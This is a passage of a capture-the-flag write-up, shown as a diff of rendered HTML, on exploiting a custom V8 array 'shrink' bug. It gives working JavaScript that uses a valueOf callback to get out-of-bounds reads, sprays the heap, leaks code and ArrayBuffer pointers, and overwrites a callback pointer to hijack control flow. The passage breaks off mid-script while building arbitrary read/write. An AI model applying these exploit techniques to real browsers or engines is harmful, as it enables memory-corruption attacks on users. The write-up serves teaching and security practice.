+    <span class="mh">0x4ec00000d99</span><span class="p">:</span> <span class="p">[</span><span class="nb">String</span><span class="p">]</span> <span class="k">in</span> <span class="nx">ReadOnlySpace</span><span class="p">:</span> <span class="err">#</span><span class="nx">length</span><span class="p">:</span> <span class="mh">0x04ec00025fed</span> <span class="o">&lt;</span><span class="nx">AccessorInfo</span> <span class="nx">name</span><span class="o">=</span> <span class="mh">0x04ec00000d99</span> <span class="o">&lt;</span><span class="nb">String</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="err">#</span><span class="nx">length</span><span class="o">&gt;</span><span class="p">,</span> <span class="nx">data</span><span class="o">=</span> <span class="mh">0x04ec00000069</span> <span class="o">&lt;</span><span class="kc">undefined</span><span class="o">&gt;&gt;</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">accessor</span> <span class="nx">descriptor</span><span class="p">,</span> <span class="nx">attrs</span><span class="p">:</span> <span class="p">[</span><span class="nx">W__</span><span class="p">]),</span> <span class="nx">location</span><span class="p">:</span> <span class="nx">descriptor</span>
+ <span class="p">}</span>
+ <span class="o">-</span> <span class="nx">elements</span><span class="p">:</span> <span class="mh">0x04ec00042bc9</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
+           <span class="mi">0</span><span class="p">:</span> <span class="mh">0x04ec00044b11</span> <span class="o">&lt;</span><span class="nb">Object</span> <span class="nx">map</span> <span class="o">=</span> <span class="mh">0x4ec001c0f6d</span><span class="o">&gt;</span>
+        <span class="mi">1</span><span class="o">-</span><span class="mi">17</span><span class="p">:</span> <span class="mh">0x04ec00000741</span> <span class="o">&lt;</span><span class="nx">the_hole_value</span><span class="o">&gt;</span>
+ <span class="p">}</span>
+ <span class="p">...</span>
+</code></pre></div></div>
+
+<p>If I then try and access something past the end of the elements list, I get a crash:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span>
+<span class="nx">abort</span><span class="p">:</span> <span class="nx">Unexpected</span> <span class="nx">instance</span> <span class="nx">type</span> <span class="nx">encountered</span>
+
+<span class="o">====</span> <span class="nx">JS</span> <span class="nx">stack</span> <span class="nx">trace</span> <span class="o">=========================================</span>
+
+    <span class="mi">0</span><span class="p">:</span> <span class="nx">ExitFrame</span> <span class="p">[</span><span class="nx">pc</span><span class="p">:</span> <span class="mh">0x61c163bedbf6</span><span class="p">]</span>
+    <span class="mi">1</span><span class="p">:</span> <span class="nx">StubFrame</span> <span class="p">[</span><span class="nx">pc</span><span class="p">:</span> <span class="mh">0x61c163b5398f</span><span class="p">]</span>
+    <span class="mi">2</span><span class="p">:</span> <span class="nc">Stringify</span><span class="p">(</span><span class="nx">aka</span> <span class="nx">Stringify</span><span class="p">)</span> <span class="p">[</span><span class="mh">0x4ec0004570d</span><span class="p">]</span> <span class="p">[</span><span class="nx">d8</span><span class="o">-</span><span class="nx">stringify</span><span class="p">:</span><span class="o">~</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="nx">pc</span><span class="o">=</span><span class="mh">0x61c1c3b401ce</span><span class="p">](</span><span class="k">this</span><span class="o">=</span><span class="mh">0x04ec00000069</span> <span class="o">&lt;</span><span class="kc">undefined</span><span class="o">&gt;</span><span class="p">,</span><span class="mh">0x04ec00000971</span> <span class="o">&lt;</span><span class="nc">Map</span><span class="p">(</span><span class="nx">FREE_SPACE_TYPE</span><span class="p">)</span><span class="o">&gt;</span><span class="err">#</span><span class="mi">0</span><span class="err">#</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
+    <span class="mi">3</span><span class="p">:</span> <span class="nx">InternalFrame</span> <span class="p">[</span><span class="nx">pc</span><span class="p">:</span> <span class="mh">0x61c163b4e01c</span><span class="p">]</span>
+    <span class="mi">4</span><span class="p">:</span> <span class="nx">EntryFrame</span> <span class="p">[</span><span class="nx">pc</span><span class="p">:</span> <span class="mh">0x61c163b4dd5f</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>Which seems good?</p>
+
+<p>My teammates also shared this writeup <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a> in which they are given an out-of-bounds primitive and use an array of double type elements to do out-of-bounds reads and writes. I borrowed some helper methods for converting between floats and integers from them.</p>
+
+<p>Here is a modified PoC using doubles and the helper methods:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span> <span class="k">return</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="p">}</span>
+<span class="kd">function</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="p">}</span>
+
+<span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">(</span><span class="mi">2000</span><span class="p">).</span><span class="nf">fill</span><span class="p">(</span><span class="mf">1.1</span><span class="p">);</span>
+<span class="nx">evil</span> <span class="o">=</span> <span class="p">{</span> <span class="nf">valueOf</span><span class="p">()</span> <span class="p">{</span> <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arr</span><span class="p">.</span><span class="nf">pop</span><span class="p">();</span> <span class="p">}</span> <span class="k">return</span> <span class="mi">1999</span><span class="p">;</span> <span class="p">}</span> <span class="p">};</span>
+<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">27</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">before </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span> <span class="p">}</span>
+<span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="nx">evil</span><span class="p">)</span>
+<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">27</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">after </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>this produces output that looks like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; before 0: 0x3ff199999999999a
+before 1: 0x3ff199999999999a
+before 2: 0x3ff199999999999a
+before 3: 0x3ff199999999999a
+before 4: 0x3ff199999999999a
+before 5: 0x3ff199999999999a
+before 6: 0x3ff199999999999a
+before 7: 0x3ff199999999999a
+before 8: 0x3ff199999999999a
+before 9: 0x3ff199999999999a
+before 10: 0x3ff199999999999a
+before 11: 0x3ff199999999999a
+before 12: 0x3ff199999999999a
+before 13: 0x3ff199999999999a
+before 14: 0x3ff199999999999a
+before 15: 0x3ff199999999999a
+before 16: 0x3ff199999999999a
+before 17: 0x3ff199999999999a
+before 18: 0x3ff199999999999a
+before 19: 0x3ff199999999999a
+undefined
+d8&gt; undefined
+d8&gt; after 0: 0x3ff199999999999a
+after 1: 0x7ff8000000000000
+after 2: 0x7ff8000000000000
+after 3: 0x7ff8000000000000
+after 4: 0x7ff8000000000000
+after 5: 0x7ff8000000000000
+after 6: 0x7ff8000000000000
+after 7: 0x7ff8000000000000
+after 8: 0x7ff8000000000000
+after 9: 0x7ff8000000000000
+after 10: 0x7ff8000000000000
+after 11: 0x7ff8000000000000
+after 12: 0x7ff8000000000000
+after 13: 0x7ff8000000000000
+after 14: 0x7ff8000000000000
+after 15: 0x7ff8000000000000
+after 16: 0x7ff8000000000000
+after 17: 0x7ff8000000000000
+after 18: 0xc000000971
+after 19: 0x7ff8000000000000
+undefined
+d8&gt;
+</code></pre></div></div>
+<p>So we are now able to view data out-of-bounds of our array, most of which looks the same, this is probably related to <code class="language-plaintext highlighter-rouge">the\_hole\_value</code>, the value javascript uses as a filler element when resizing arrays. These elements were just recently freed though, so I figured we should see if we can reclaim them.</p>
+
+<p>I have no idea how the allocator works in v8 so I just tried allocating a ton of arrays to see if eventually it would get reclaimed by other data:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span> <span class="k">return</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="p">}</span>
+<span class="kd">function</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="p">}</span>
+
+<span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">(</span><span class="mi">2000</span><span class="p">).</span><span class="nf">fill</span><span class="p">(</span><span class="mf">1.1</span><span class="p">);</span>
+<span class="nx">evil</span> <span class="o">=</span> <span class="p">{</span> <span class="nf">valueOf</span><span class="p">()</span> <span class="p">{</span> <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arr</span><span class="p">.</span><span class="nf">pop</span><span class="p">();</span> <span class="p">}</span> <span class="k">return</span> <span class="mi">1999</span><span class="p">;</span> <span class="p">}</span> <span class="p">};</span>
+<span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="nx">evil</span><span class="p">)</span>
+
+<span class="kd">let</span> <span class="nx">arrs</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">50000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arrs</span><span class="p">.</span><span class="nf">push</span><span class="p">([</span><span class="mf">1.1</span><span class="p">]);</span> <span class="p">}</span>
+
+<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">after </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>And here was the result:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>after 0: 0x3ff199999999999a
+...
+after 18: 0xc00000999
+after 19: 0x1d1fb900280dad
+after 20: 0x1d2165001d20a5
+after 21: 0x6900000069
+after 22: 0x600000999
+after 23: 0x1d1fb900280dad
+after 24: 0x859001d20a5
+after 25: 0x5555566c8830
+after 26: 0x4000005e5
+after 27: 0x1d40bfbe1be82a
+after 28: 0x4000005e5
+after 29: 0x1d477b3bd65d3c
+after 30: 0x4000005e5
+after 31: 0x1d34bbe5445d68
+after 32: 0x4000005e5
+after 33: 0x1d360f9984896a
+after 34: 0x4000005e5
+after 35: 0x1d50437afb5294
+after 36: 0x4000005e5
+after 37: 0x1d515fb3f73494
+after 38: 0x4000005e5
+after 39: 0x1d4c176c4c35ac
+after 40: 0x4000005e5
+after 41: 0x1d45c727042db2
+after 42: 0x4000005e5
+after 43: 0x1d43e3d15d1ab6
+after 44: 0x4000005e5
+after 45: 0x1d4e8bbd48c1c4
+after 46: 0x4000005e5
+after 47: 0x1d41e34b5b94ce
+after 48: 0x4000005e5
+after 49: 0x1d4307b55068e6
+</code></pre></div></div>
+
+<h1 id="control-flow-hijacking">Control Flow Hijacking?</h1>
+
+<p>Wildly, there is actually a code pointer in that output at index 25 <code class="language-plaintext highlighter-rouge">0x5555566c8830</code> which points to <code class="language-plaintext highlighter-rouge">v8::PrintMessageCallback</code>.
+We can actually just overwite this and get control flow hijacking when an error occurs in the repl:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="nf">itof</span><span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">));</span>
+<span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">25</span><span class="p">]).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
+<span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">meow</span> <span class="c1">// this is undefined so the repl errors</span>
+
+<span class="nx">Thread</span> <span class="mi">1</span> <span class="dl">"</span><span class="s2">d8</span><span class="dl">"</span> <span class="nx">received</span> <span class="nx">signal</span> <span class="nx">SIGSEGV</span><span class="p">,</span> <span class="nx">Segmentation</span> <span class="nx">fault</span><span class="p">.</span>
+<span class="mh">0x00000000deadbeef</span> <span class="k">in</span> <span class="o">??</span> <span class="p">()</span>
+<span class="o">--------------------------------------------------------------------------------------------------</span> <span class="nx">code</span><span class="p">:</span><span class="nx">x86</span><span class="p">:</span><span class="mi">64</span> <span class="o">----</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nx">Cannot</span> <span class="nx">access</span> <span class="nx">memory</span> <span class="nx">at</span> <span class="nx">address</span> <span class="mh">0xdeadbeef</span>
+<span class="o">-------------------------------------------------------------------------------------------------------------------</span>
+<span class="nx">gef</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>I tried exploiting this for a while, but the register state at the control flow hijacking site wasn’t great for achieving any kind of stack pivot.</p>
+
+<h1 id="arb-readwrite">Arb Read/Write</h1>
+
+<p>Looking back this writeup <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a>, they hijacked a pointer to the <code class="language-plaintext highlighter-rouge">backing_store</code> of an ArrayBuffer object.
+So I figured I’d try just spraying ArrayBuffers and see if I can just directly edit their backing store using the OOB I have.</p>
+
+<p>Frustratingly, there is different behavior between running <code class="language-plaintext highlighter-rouge">./d8 &lt;js_file_path&gt;</code> versus <code class="language-plaintext highlighter-rouge">./d8</code> and sending input to the REPL, so from this point on I use the prior method to be consistent with remote.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span> <span class="k">return</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">(</span><span class="mi">2000</span><span class="p">).</span><span class="nf">fill</span><span class="p">(</span><span class="mf">1.1</span><span class="p">);</span>
+<span class="nx">evil</span> <span class="o">=</span> <span class="p">{</span> <span class="nf">valueOf</span><span class="p">()</span> <span class="p">{</span> <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arr</span><span class="p">.</span><span class="nf">pop</span><span class="p">();</span> <span class="p">}</span> <span class="k">return</span> <span class="mi">1999</span><span class="p">;</span> <span class="p">}</span> <span class="p">};</span>
+<span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="nx">evil</span><span class="p">)</span>
+
+<span class="kd">let</span> <span class="nx">arrs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">()</span>
+<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arrs</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span> <span class="p">}</span>
+
+<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">: 0x</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span> <span class="p">}</span>
+
+<span class="c1">// OUT:</span>
+<span class="c1">// ...</span>
+<span class="c1">// 25: 0x5555566c8830</span>
+<span class="c1">// ...</span>
+<span class="c1">// 30: 0x57ef24d000000000</span>
+<span class="c1">// 31: 0x22800000005555</span>
+</code></pre></div></div>
+
+<p>Turns out spraying 100000 ArrayBuffers was enough to reclaim the memory of our array elements! The code pointer is still there and at index 30/31 there is actually a misaligned heap pointer:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; vmmap 0x555557ef24d0
+[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
+Start              End                Size               Offset             Perm Path
+0x0000555557e50000 0x00005555594cb000 0x000000000167b000 0x0000000000000000 rw- [heap]
+</code></pre></div></div>
+
+<p>This is very likely to be a <code class="language-plaintext highlighter-rouge">backing_store</code> field of one of the ArrayBuffers we allocated.</p>
+
+<p>I confirmed this by doing <code class="language-plaintext highlighter-rouge">%DebugPrint(arrs[0])</code> and seeing that the <code class="language-plaintext highlighter-rouge">backing_store</code> pointer matched the one that was leaked.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DebugPrint: 0x234e00280021: [JSArrayBuffer] in OldSpace
+ - map: 0x234e001c87b9 &lt;Map[56](HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x234e001c894d &lt;Object map = 0x234e001c87e1&gt;
+ - elements: 0x234e00000725 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - cpp_heap_wrappable: 0
+ - backing_store: 0x555557ef24d0 &lt;--- matches pointer from leak
+ - byte_length: 8
+ - max_byte_length: 8
+...
+</code></pre></div></div>
+
+<p>According to <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">this</a> we can overwrite the pointer and get arb/read write by wrapping it in a DataView:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nf">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span> <span class="k">return</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span> <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nc">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="p">}</span>
+
+<span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">(</span><span class="mi">2000</span><span class="p">).</span><span class="nf">fill</span><span class="p">(</span><span class="mf">1.1</span><span class="p">);</span>
+<span class="nx">evil</span> <span class="o">=</span> <span class="p">{</span> <span class="nf">valueOf</span><span class="p">()</span> <span class="p">{</span> <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arr</span><span class="p">.</span><span class="nf">pop</span><span class="p">();</span> <span class="p">}</span> <span class="k">return</span> <span class="mi">1999</span><span class="p">;</span> <span class="p">}</span> <span class="p">};</span>
+<span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="nx">evil</span><span class="p">)</span>
+
+<span class="kd">let</span> <span class="nx">arrs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">()</span>
+
+<span class="c1">// allocate until we see the code pointer in idx 25</span>
